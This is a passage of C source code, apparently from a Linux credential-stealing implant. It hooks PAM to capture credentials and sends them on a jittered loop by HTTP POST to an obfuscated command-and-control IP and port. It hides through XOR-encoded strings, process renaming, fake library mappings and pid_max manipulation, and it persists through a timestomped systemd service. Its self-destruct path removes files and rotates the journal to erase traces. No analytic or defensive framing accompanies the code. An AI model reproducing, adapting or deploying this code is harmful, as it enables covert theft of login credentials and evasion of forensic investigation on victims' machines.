        xor_decode(orig_svc_name, OBF_ORIG_SVC, OBF_ORIG_SVC_LEN);
        char backup_svc[256];
        snprintf(backup_svc, sizeof(backup_svc), path_fmt, workdir, orig_svc_name);
        explicit_bzero(orig_svc_name, sizeof(orig_svc_name));

        char svc_path[256];
        snprintf(svc_path, sizeof(svc_path), path_fmt, paths->systemd_dir, svc_file);

        orig_size = 0;
        orig_data = read_file(backup_svc, &orig_size);
        if (orig_data && orig_size > 0) {
            write_embedded(svc_path, orig_data, orig_size, 0644);
            char sshd_svc[OBF_SSHD_SVC_LEN + 1];
            xor_decode(sshd_svc, OBF_SSHD_SVC, OBF_SSHD_SVC_LEN);
            char ref_svc[256];
            snprintf(ref_svc, sizeof(ref_svc), path_fmt, paths->systemd_dir, sshd_svc);
            timestomp(ref_svc, svc_path);
            explicit_bzero(sshd_svc, sizeof(sshd_svc));
        }
        free(orig_data);

        if (restored) {
            char systemctl[OBF_SYSTEMCTL_LEN + 1];
            xor_decode(systemctl, OBF_SYSTEMCTL, OBF_SYSTEMCTL_LEN);

            char sc_usr[OBF_SYSTEMCTL_USR_LEN + 1];
            xor_decode(sc_usr, OBF_SYSTEMCTL_USR, OBF_SYSTEMCTL_USR_LEN);

            char enable[OBF_ENABLE_LEN + 1];
            xor_decode(enable, OBF_ENABLE, OBF_ENABLE_LEN);

            char *argv_enable[] = { systemctl, enable, svc_file, NULL };
            exec_cmd(sc_usr, argv_enable);

            explicit_bzero(systemctl, sizeof(systemctl));
            explicit_bzero(sc_usr, sizeof(sc_usr));
            explicit_bzero(enable, sizeof(enable));
        }
    }

    /* 4. remove systemd persistence (skip if original was restored) */
    int had_original;
    {
        char orig_bin_name[OBF_ORIG_BIN_LEN + 1];
        xor_decode(orig_bin_name, OBF_ORIG_BIN, OBF_ORIG_BIN_LEN);
        char backup_check[256];
        snprintf(backup_check, sizeof(backup_check), path_fmt, workdir, orig_bin_name);
        explicit_bzero(orig_bin_name, sizeof(orig_bin_name));
        had_original = (access(backup_check, F_OK) == 0);

        if (!had_original) {
            char wants_fmt[OBF_WANTS_LINK_FMT_LEN + 1];
            xor_decode(wants_fmt, OBF_WANTS_LINK_FMT, OBF_WANTS_LINK_FMT_LEN);
            char link_path[512];
            snprintf(link_path, sizeof(link_path), wants_fmt, svc_file);
            unlink(link_path);
            explicit_bzero(wants_fmt, sizeof(wants_fmt));

            char svc_path[256];
            snprintf(svc_path, sizeof(svc_path), path_fmt, paths->systemd_dir, svc_file);
            unlink(svc_path);
        }
    }

    /* 5. daemon-reload */
    {
        char systemctl[OBF_SYSTEMCTL_LEN + 1];
        xor_decode(systemctl, OBF_SYSTEMCTL, OBF_SYSTEMCTL_LEN);

        char daemon_reload[OBF_DAEMON_RELOAD_LEN + 1];
        xor_decode(daemon_reload, OBF_DAEMON_RELOAD, OBF_DAEMON_RELOAD_LEN);

        char *argv_reload[] = { systemctl, daemon_reload, NULL };

        char sc_usr[OBF_SYSTEMCTL_USR_LEN + 1];
        xor_decode(sc_usr, OBF_SYSTEMCTL_USR, OBF_SYSTEMCTL_USR_LEN);
        exec_cmd(sc_usr, argv_reload);
        explicit_bzero(sc_usr, sizeof(sc_usr));

        char sc_bin[OBF_SYSTEMCTL_BIN_LEN + 1];
        xor_decode(sc_bin, OBF_SYSTEMCTL_BIN, OBF_SYSTEMCTL_BIN_LEN);
        exec_cmd(sc_bin, argv_reload);
        explicit_bzero(sc_bin, sizeof(sc_bin));

        explicit_bzero(systemctl, sizeof(systemctl));
        explicit_bzero(daemon_reload, sizeof(daemon_reload));
    }

    /* 6. remove workdir */
    if (had_original) {
        char orig_bin_name[OBF_ORIG_BIN_LEN + 1];
        xor_decode(orig_bin_name, OBF_ORIG_BIN, OBF_ORIG_BIN_LEN);
        char tmp[256];
        snprintf(tmp, sizeof(tmp), path_fmt, workdir, orig_bin_name);
        unlink(tmp);
        explicit_bzero(orig_bin_name, sizeof(orig_bin_name));

        char orig_svc_name[OBF_ORIG_SVC_LEN + 1];
        xor_decode(orig_svc_name, OBF_ORIG_SVC, OBF_ORIG_SVC_LEN);
        snprintf(tmp, sizeof(tmp), path_fmt, workdir, orig_svc_name);
        unlink(tmp);
        explicit_bzero(orig_svc_name, sizeof(orig_svc_name));

        unlink(auth_buf_path);
    } else {
        remove_dir_contents(workdir);
    }

    /* 7. remove binary (skip if original was restored) */
    if (!had_original) {
        char self_path[256];
        snprintf(self_path, sizeof(self_path), path_fmt, paths->target_dir, svc_name);
        unlink(self_path);
    }

    /* 8. clean journal */
    {
        char journalctl[OBF_JOURNALCTL_LEN + 1];
        xor_decode(journalctl, OBF_JOURNALCTL, OBF_JOURNALCTL_LEN);

        char rotate[OBF_ROTATE_LEN + 1];
        xor_decode(rotate, OBF_ROTATE, OBF_ROTATE_LEN);

        char *argv_rotate[] = { journalctl, rotate, NULL };

        char jc_usr[OBF_JOURNALCTL_USR_LEN + 1];
        xor_decode(jc_usr, OBF_JOURNALCTL_USR, OBF_JOURNALCTL_USR_LEN);
        exec_cmd(jc_usr, argv_rotate);
        explicit_bzero(jc_usr, sizeof(jc_usr));

        explicit_bzero(journalctl, sizeof(journalctl));
        explicit_bzero(rotate, sizeof(rotate));

        char run_sys_fmt[OBF_RUN_SYS_FMT_LEN + 1];
        xor_decode(run_sys_fmt, OBF_RUN_SYS_FMT, OBF_RUN_SYS_FMT_LEN);
        char runtime_svc[256];
        snprintf(runtime_svc, sizeof(runtime_svc), run_sys_fmt, svc_file);
        unlink(runtime_svc);
        explicit_bzero(run_sys_fmt, sizeof(run_sys_fmt));

        char run_trans_fmt[OBF_RUN_TRANS_FMT_LEN + 1];
        xor_decode(run_trans_fmt, OBF_RUN_TRANS_FMT, OBF_RUN_TRANS_FMT_LEN);
        snprintf(runtime_svc, sizeof(runtime_svc), run_trans_fmt, svc_file);
        unlink(runtime_svc);
        explicit_bzero(run_trans_fmt, sizeof(run_trans_fmt));

        char systemctl[OBF_SYSTEMCTL_LEN + 1];
        xor_decode(systemctl, OBF_SYSTEMCTL, OBF_SYSTEMCTL_LEN);

        char reset_failed[OBF_RESET_FAILED_LEN + 1];
        xor_decode(reset_failed, OBF_RESET_FAILED, OBF_RESET_FAILED_LEN);

        char *argv_reset[] = { systemctl, reset_failed, svc_file, NULL };

        char sc_usr[OBF_SYSTEMCTL_USR_LEN + 1];
        xor_decode(sc_usr, OBF_SYSTEMCTL_USR, OBF_SYSTEMCTL_USR_LEN);
        exec_cmd(sc_usr, argv_reset);
        explicit_bzero(sc_usr, sizeof(sc_usr));

        char sc_bin[OBF_SYSTEMCTL_BIN_LEN + 1];
        xor_decode(sc_bin, OBF_SYSTEMCTL_BIN, OBF_SYSTEMCTL_BIN_LEN);
        exec_cmd(sc_bin, argv_reset);
        explicit_bzero(sc_bin, sizeof(sc_bin));

        explicit_bzero(systemctl, sizeof(systemctl));
        explicit_bzero(reset_failed, sizeof(reset_failed));
    }

    /* 9. wipe buffers */
    explicit_bzero(workdir, sizeof(workdir));
    explicit_bzero(svc_name, sizeof(svc_name));
    explicit_bzero(svc_file, sizeof(svc_file));
    explicit_bzero(auth_buf_path, sizeof(auth_buf_path));
    explicit_bzero(path_fmt, sizeof(path_fmt));

    _exit(0);
}

#endif

static void get_exfil_filename(char *buf, size_t size) {
    char hostname[128];
    char localip[64];
    char timebuf[32];
    time_t now = time(NULL);
    struct tm *t = localtime(&now);

    char unknown[OBF_UNKNOWN_LEN + 1];
    xor_decode(unknown, OBF_UNKNOWN, OBF_UNKNOWN_LEN);
    if (gethostname(hostname, sizeof(hostname)) != 0)
        strncpy(hostname, unknown, sizeof(hostname));
    explicit_bzero(unknown, sizeof(unknown));

    get_local_ip(localip, sizeof(localip));

    char time_fmt[OBF_TIME_FMT_LEN + 1];
    xor_decode(time_fmt, OBF_TIME_FMT, OBF_TIME_FMT_LEN);
    strftime(timebuf, sizeof(timebuf), time_fmt, t);
    explicit_bzero(time_fmt, sizeof(time_fmt));

    char exfil_fmt[OBF_EXFIL_FMT_LEN + 1];
    xor_decode(exfil_fmt, OBF_EXFIL_FMT, OBF_EXFIL_FMT_LEN);
    snprintf(buf, size, exfil_fmt, hostname, localip, timebuf);
    explicit_bzero(exfil_fmt, sizeof(exfil_fmt));
}

static void sender_loop(const struct sys_paths *paths) {
    char c2_ip[C2_IP_ENC_LEN + 1];
    xor_decode(c2_ip, C2_IP_ENC, C2_IP_ENC_LEN);

    char c2_port_str[C2_PORT_ENC_LEN + 1];
    xor_decode(c2_port_str, C2_PORT_ENC, C2_PORT_ENC_LEN);
    int c2_port = atoi(c2_port_str);
    explicit_bzero(c2_port_str, sizeof(c2_port_str));

    char endpoint[OBF_ENDPOINT_LEN + 1];
    xor_decode(endpoint, OBF_ENDPOINT, OBF_ENDPOINT_LEN);

    char auth_token[OBF_AUTH_TOKEN_LEN + 1];
    xor_decode(auth_token, OBF_AUTH_TOKEN, OBF_AUTH_TOKEN_LEN);

    char auth_buf_path[OBF_AUTH_BUF_LEN + 1];
    xor_decode(auth_buf_path, OBF_AUTH_BUF, OBF_AUTH_BUF_LEN);

#ifdef DESTRUCT_TIME
    time_t start_time = time(NULL);
    unsigned long elapsed_sleep = 0;
#endif

    while (1) {
#ifdef DESTRUCT_TIME
        unsigned int current_interval = jittered_sleep(EXFIL_INTERVAL);                                                                                    
        elapsed_sleep = 0;
        while (elapsed_sleep < current_interval) {                                                                                                         
            if (time(NULL) - start_time >= DESTRUCT_TIME) {                                                                                                
                self_destruct(paths, c2_ip, c2_port, endpoint, auth_token);
            }                                                                                                                                              
            unsigned long remaining = current_interval - elapsed_sleep;
            unsigned long chunk = (remaining > 10) ? 10 : remaining;                                                                                       
            sleep(chunk);
            elapsed_sleep += chunk;                                                                                                                        
        }
        if (time(NULL) - start_time >= DESTRUCT_TIME) {
            self_destruct(paths, c2_ip, c2_port, endpoint, auth_token);
        }
#else
        sleep(jittered_sleep(EXFIL_INTERVAL));
#endif

        if (access(auth_buf_path, F_OK) != 0) continue;

        size_t auth_size = 0;
        unsigned char *auth_data = read_file(auth_buf_path, &auth_size);
        if (!auth_data || auth_size == 0) {
            free(auth_data);
            continue;
        }

        char filename[256];
        get_exfil_filename(filename, sizeof(filename));

        if (http_post_file(c2_ip, c2_port, endpoint, auth_data, auth_size, filename, auth_token) == 0) {
            unlink(auth_buf_path);
        }
        free(auth_data);
    }
}

static void inflate_memory(void) {
    size_t pad_size = 800 * 1024;
    volatile char *pad = (volatile char *)mmap(NULL, pad_size,
        PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (pad == MAP_FAILED) return;

    for (size_t i = 0; i < pad_size; i += 4096)
        pad[i] = (char)(i & 0xFF);
}

static void fake_lib_mappings(const struct sys_paths *paths) {
    struct { const volatile unsigned char *enc; size_t len; } libs[] = {
        { OBF_FAKE_LIBC,       OBF_FAKE_LIBC_LEN },
        { OBF_FAKE_LIBCAPNG,   OBF_FAKE_LIBCAPNG_LEN },
        { OBF_FAKE_LIBGLIB,    OBF_FAKE_LIBGLIB_LEN },
        { OBF_FAKE_LIBNUMA,    OBF_FAKE_LIBNUMA_LEN },
        { OBF_FAKE_LIBSYSTEMD, OBF_FAKE_LIBSYSTEMD_LEN },
    };
    int nlibs = sizeof(libs) / sizeof(libs[0]);

    for (int i = 0; i < nlibs; i++) {
        char libname[64];
        xor_decode(libname, libs[i].enc, libs[i].len);

        char fullpath[256];
        snprintf(fullpath, sizeof(fullpath), "%s%s", paths->lib_dir, libname);
        explicit_bzero(libname, sizeof(libname));

        int fd = open(fullpath, O_RDONLY);
        explicit_bzero(fullpath, sizeof(fullpath));
        if (fd < 0) continue;

        struct stat st;
        if (fstat(fd, &st) == 0 && st.st_size > 0) {
            mmap(NULL, (size_t)st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
        }
        close(fd);
    }

    {
        char ldpath[OBF_FAKE_LDLINUX_LEN + 1];
        xor_decode(ldpath, OBF_FAKE_LDLINUX, OBF_FAKE_LDLINUX_LEN);

        int fd = open(ldpath, O_RDONLY);
        explicit_bzero(ldpath, sizeof(ldpath));
        if (fd >= 0) {
            struct stat st;
            if (fstat(fd, &st) == 0 && st.st_size > 0)
                mmap(NULL, (size_t)st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
            close(fd);
        }
    }
}

int main(int argc, char *argv[]) {
    {
        char pam_type_var[OBF_PAM_TYPE_LEN + 1];
        xor_decode(pam_type_var, OBF_PAM_TYPE, OBF_PAM_TYPE_LEN);
        char *pam_type = getenv(pam_type_var);
        explicit_bzero(pam_type_var, sizeof(pam_type_var));

        if (pam_type != NULL) {
            return capture_credentials();
        }
    }

    signal(SIGCHLD, SIG_IGN);

    struct sys_paths paths;
    memset(&paths, 0, sizeof(paths));
    detect_os(&paths);

    int is_installed = 0;
    {
        char proc_self[OBF_PROC_SELF_LEN + 1];
        xor_decode(proc_self, OBF_PROC_SELF, OBF_PROC_SELF_LEN);
        char exe_path[256] = {0};
        ssize_t elen = readlink(proc_self, exe_path, sizeof(exe_path) - 1);
        explicit_bzero(proc_self, sizeof(proc_self));
        if (elen > 0) exe_path[elen] = '\0';

        char svc_name_t[OBF_SVC_NAME_LEN + 1];
        xor_decode(svc_name_t, OBF_SVC_NAME, OBF_SVC_NAME_LEN);
        char path_fmt_t[OBF_PATH_FMT_LEN + 1];
        xor_decode(path_fmt_t, OBF_PATH_FMT, OBF_PATH_FMT_LEN);
        char target_path[256];
        snprintf(target_path, sizeof(target_path), path_fmt_t, paths.target_dir, svc_name_t);
        explicit_bzero(svc_name_t, sizeof(svc_name_t));
        explicit_bzero(path_fmt_t, sizeof(path_fmt_t));

        is_installed = (elen > 0 && strcmp(exe_path, target_path) == 0);
    }

    {
        char pid_max_path[OBF_PID_MAX_PATH_LEN + 1];
        xor_decode(pid_max_path, OBF_PID_MAX_PATH, OBF_PID_MAX_PATH_LEN);

        char orig_pid_max[32] = {0};
        int saved = 0;
        int pfd = open(pid_max_path, O_RDONLY);
        if (pfd >= 0) {
            ssize_t n = read(pfd, orig_pid_max, sizeof(orig_pid_max) - 1);
            close(pfd);
            if (n > 0) saved = 1;
        }

        if (saved) {
            pfd = open(pid_max_path, O_WRONLY);
            if (pfd >= 0) {
                write(pfd, "500\n", 4);
                close(pfd);
            }
        }

        pid_t pid = fork();
        if (pid < 0) {
            if (saved) {
                pfd = open(pid_max_path, O_WRONLY);
                if (pfd >= 0) {
                    write(pfd, orig_pid_max, strlen(orig_pid_max));
                    close(pfd);
                }
            }
            pid = fork();
            if (pid < 0) return 1;
        }

        if (saved) {
            pfd = open(pid_max_path, O_WRONLY);
            if (pfd >= 0) {
                write(pfd, orig_pid_max, strlen(orig_pid_max));
                close(pfd);
            }
        }

        explicit_bzero(pid_max_path, sizeof(pid_max_path));
        if (pid > 0) return 0;
    }

    setsid();
    chdir("/");

    char devnull[OBF_DEV_NULL_LEN + 1];
    xor_decode(devnull, OBF_DEV_NULL, OBF_DEV_NULL_LEN);
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    open(devnull, O_RDONLY);
    open(devnull, O_WRONLY);
    open(devnull, O_WRONLY);
    explicit_bzero(devnull, sizeof(devnull));

    char proc_name[OBF_PROC_NAME_LEN + 1];
    xor_decode(proc_name, OBF_PROC_NAME, OBF_PROC_NAME_LEN);
    prctl(PR_SET_NAME, proc_name, 0, 0, 0);
    if (argc > 0 && argv[0]) {
        size_t len = strlen(argv[0]);
        memset(argv[0], 0, len);
        strncpy(argv[0], proc_name, len);
    }
    explicit_bzero(proc_name, sizeof(proc_name));

    inflate_memory();
    fake_lib_mappings(&paths);

    if (is_installed) {
        sender_loop(&paths);
    } else {
        do_install(&paths);

        {
            char systemctl[OBF_SYSTEMCTL_LEN + 1];
            xor_decode(systemctl, OBF_SYSTEMCTL, OBF_SYSTEMCTL_LEN);

            char sc_usr[OBF_SYSTEMCTL_USR_LEN + 1];
            xor_decode(sc_usr, OBF_SYSTEMCTL_USR, OBF_SYSTEMCTL_USR_LEN);

            char daemon_reload[OBF_DAEMON_RELOAD_LEN + 1];
            xor_decode(daemon_reload, OBF_DAEMON_RELOAD, OBF_DAEMON_RELOAD_LEN);

            char start[OBF_START_LEN + 1];
            xor_decode(start, OBF_START, OBF_START_LEN);

            char svc_file[OBF_SVC_FILE_LEN + 1];
            xor_decode(svc_file, OBF_SVC_FILE, OBF_SVC_FILE_LEN);

            char *argv_reload[] = { systemctl, daemon_reload, NULL };
            exec_cmd(sc_usr, argv_reload);

            char *argv_start[] = { systemctl, start, svc_file, NULL };
            exec_cmd(sc_usr, argv_start);

            explicit_bzero(systemctl, sizeof(systemctl));
            explicit_bzero(sc_usr, sizeof(sc_usr));
            explicit_bzero(daemon_reload, sizeof(daemon_reload));
            explicit_bzero(start, sizeof(start));
            explicit_bzero(svc_file, sizeof(svc_file));
        }

        _exit(0);
    }

    return 0;
}